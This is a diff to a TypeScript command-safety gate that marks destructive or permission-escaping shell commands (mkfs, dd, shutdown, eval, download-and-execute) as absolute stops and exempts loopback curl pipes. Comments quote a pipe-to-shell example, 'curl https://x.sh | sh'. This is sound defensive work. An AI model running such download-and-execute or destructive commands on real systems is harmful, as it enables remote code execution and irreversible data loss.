@@ -495,6 +495,39 @@ function d7ResolveSentinel(
   return { kind: "stop", reason: "runtime location unresolvable" };
 }
 
+/**
+ * D-g (docs/dspa-intent-floor.md): the ABSOLUTE bars the pattern tables name.
+ * `config/dangerous-patterns.ts` flags the entries whose bar is absolute, and
+ * the analysis marks those hits `[Absolute] <label>` (every other entry is a
+ * CLASS label the judge rules on — D1). Matching on the reason the analysis
+ * already emitted, rather than re-matching the table in the gate, is what keeps
+ * the analysis's own exclusions: trusted commands, version-only invocations and
+ * quoted text (`grep "curl | bash" notes.md`) never reach the bar.
+ */
+const ABSOLUTE_REASON_RE = /^\[Absolute\]\s*(.+)$/;
+function absoluteBarHits(reasons: string[]): string[] {
+  return [...new Set(
+    reasons.map((r) => ABSOLUTE_REASON_RE.exec(r)?.[1]).filter((l): l is string => l !== undefined),
+  )];
+}
+
+/** A pattern-table CLASS label (not an absolute bar) — the half D-b hands to
+ * the judge. Evaluator-side reasons (`[Tool]`, `[System]`, `[Risk]`, …) are
+ * NOT class labels and keep their conservative behavior everywhere. */
+const CLASS_LABEL_REASON_RE = /^\[Pattern\]\s/;
+
+/**
+ * The download-and-execute bar is about REMOTE code. The 2026-10-19 ledger
+ * replay turned up the FP that motivated this exemption: two real rows of
+ * `curl -s localhost:8080/v1/status | python3 -c 'json.load(sys.stdin)'` — a
+ * local API answer being parsed — flipped from auto-allow to an absolute stop.
+ * Locality is already decided, fail-closed, by the egress check's
+ * `isLoopbackEgress`; the bar reuses that answer instead of inventing a second
+ * one. A non-loopback host keeps the bar (curl https://x.sh | sh).
+ * Coupled to the label text — see config/dangerous-patterns.ts.
+ */
+const REMOTE_EXEC_LABEL_RE = /download & execute/;
+
 export async function checkDspaGate(
   pd: PromptData,
   store: Store,
@@ -568,14 +601,34 @@ export async function checkDspaGate(
     outsideExempt = rm.exempt;
     // Non-rm dangerous reasons still stop the auto-allow: the carve-out
     // covers only the rm's own footprint (recursive/forced delete, its
-    // self-written redirect/pipe). Other dangerous content in the command
-    // — script interpreters, file-modification patterns, … — stays a floor
-    // stop, advisory like every stop (D16 — the verdict renders, the stop
-    // stands).
-    const otherDanger = analysis.risk.reasons.filter((r) => !RM_RISK_REASON_RE.test(r));
+    // self-written redirect/pipe). D-b (2026-10-19) narrowed what counts
+    // here: a pattern-table CLASS label (`[Pattern] python …`) is a name the
+    // judge rules on, not a bar, and an rm next to one is the same shape the
+    // non-rm path already judges — so class labels no longer block the
+    // carve-out. Absolute bars are NOT exempted (the `absoluteBarHits` check
+    // below stops them) and evaluator-side reasons (`[Tool]`, `[System]`, …)
+    // keep blocking, as they did before.
+    const otherDanger = analysis.risk.reasons.filter(
+      (r) => !RM_RISK_REASON_RE.test(r) && !CLASS_LABEL_REASON_RE.test(r),
+    );
     if (otherDanger.length > 0) {
       return { ok: false, reason: `dangerous: ${otherDanger.join("; ").slice(0, 120)}`, advisory: true };
     }
+  }
+  // D-g: the absolute bars. Everything else the pattern tables label is a class
+  // name the judge rules on (D1); these entries destroy state the user cannot
+  // walk back, or escape the permission model — the intent path has no location
+  // to rule on, so no verdict clears them (mkfs, mount, dd, shutdown/reboot,
+  // eval, the irreversible git forms, download-and-execute).
+  const bars = absoluteBarHits(analysis.risk.reasons).filter(
+    (l) => !(REMOTE_EXEC_LABEL_RE.test(l) && isLoopbackEgress(pd.command, analysis.segments)),
+  );
+  if (bars.length > 0) {
+    return {
+      ok: false,
+      reason: `absolute bar (${bars.slice(0, 3).join("; ")})`,
+      advisory: true,
+    };
   }
   // Non-rm: unsafe patterns and risk reasons are JUDGEABLE (D1) — inline
   // scripts, redirects, pipes, subshells, file-modification patterns. The
